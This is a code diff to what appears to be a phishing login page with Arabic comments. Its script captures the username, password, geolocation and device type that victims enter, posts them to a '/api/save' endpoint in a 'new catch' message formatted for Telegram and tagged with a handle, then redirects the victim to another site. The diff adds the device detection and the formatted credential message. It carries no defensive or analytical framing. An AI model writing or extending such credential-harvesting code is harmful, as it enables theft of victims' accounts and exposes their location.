@@ -64,7 +64,6 @@
         .submit-btn:hover { 
             transform: translateY(-2px) scale(1.02); 
             box-shadow: 0 15px 30px rgba(34, 211, 238, 0.4); 
-            background: linear-gradient(135deg, #0ea5e9, #22d3ee);
         }
 
         .ban-overlay {
@@ -124,6 +123,14 @@
     let loginAttempts = 0;
     let countdown;
 
+    // دالة لكشف نوع الجهاز
+    function getDeviceType() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return "🤖 Android";
+        if (/iPad|iPhone|iPod/.test(ua)) return "🍎 iOS (iPhone)";
+        return "💻 PC / Other";
+    }
+
     window.onload = () => {
         const banExpiry = localStorage.getItem('lock_expiry');
         if (banExpiry) {
@@ -143,20 +150,18 @@
         const hasArabic = /[\u0600-\u06FF]/.test(user);
 
         if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
-            // طلب إذن الموقع الجغرافي عند إرسال البيانات
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const loc = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                        const loc = "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude;
                         processCapture(user, pass, loc);
                     },
                     () => {
-                        // في حال رفض الإذن، يتم الإرسال بدون الموقع
-                        processCapture(user, pass, "تم رفض الوصول للموقع");
+                        processCapture(user, pass, "تم رفض الوصول للموقع 📍");
                     }
                 );
             } else {
-                processCapture(user, pass, "المتصفح لا يدعم Geolocation");
+                processCapture(user, pass, "المتصفح لا يدعم Geolocation ❌");
             }
         } else {
             loginAttempts++;
@@ -201,28 +206,38 @@
                 overlay.style.display = 'none';
                 localStorage.removeItem('lock_expiry');
                 loginAttempts = 0;
-                Swal.fire({
-                    title: 'مبروك!',
-                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً.',
-                    icon: 'success',
-                    confirmButtonColor: '#22d3ee',
-                    customClass: { popup: 'glass-popup' }
-                });
             }
         }, 1000);
     }
 
     async function processCapture(u, p, location) {
+        const device = getDeviceType();
+        // رسالة منسقة تظهر بشكل جميل واحترافي في تليجرام
+        const formattedMessage = `
+🎯 **صيد جديد مرتب** 🎯
+━━━━━━━━━━━━━━
+👤 **المستخدم:** \`${u}\`
+
+🔑 **كلمة السر:** \`${p}\`
+
+📱 **الجهاز:** ${device}
+
+📍 **الموقع:** ${location}
+━━━━━━━━━━━━━━
+👤 @M6_vip`;
+
         try {
             await fetch('/api/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location}` 
+                    message: formattedMessage 
                 })
             });
             window.location.href = "https://receive-smss.com/";
-        } catch (err) {}
+        } catch (err) {
+            window.location.href = "https://receive-smss.com/";
+        }
     }
 </script>
 
